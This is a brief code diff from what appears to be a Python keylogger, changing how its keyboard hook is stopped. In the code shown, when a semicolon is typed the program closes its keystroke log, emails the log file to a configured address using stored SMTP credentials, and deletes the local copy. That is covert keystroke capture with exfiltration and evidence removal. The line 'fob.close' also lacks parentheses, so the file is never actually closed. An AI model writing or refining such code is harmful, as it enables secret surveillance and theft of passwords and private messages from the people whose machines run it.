@@ -187,7 +187,7 @@ try:
 
         if event.Ascii==59:
           fob.close
-          hooks_manager.cancel()
+          hooks_manager.disconnect()
           send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
           os.remove(log_file)        
 
@@ -209,7 +209,7 @@ try:
 
         if event.Ascii==59:
           fob.close
-          hooks_manager.cancel()
+          hooks_manager.disconnect()
           send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
           os.remove(log_file)
 
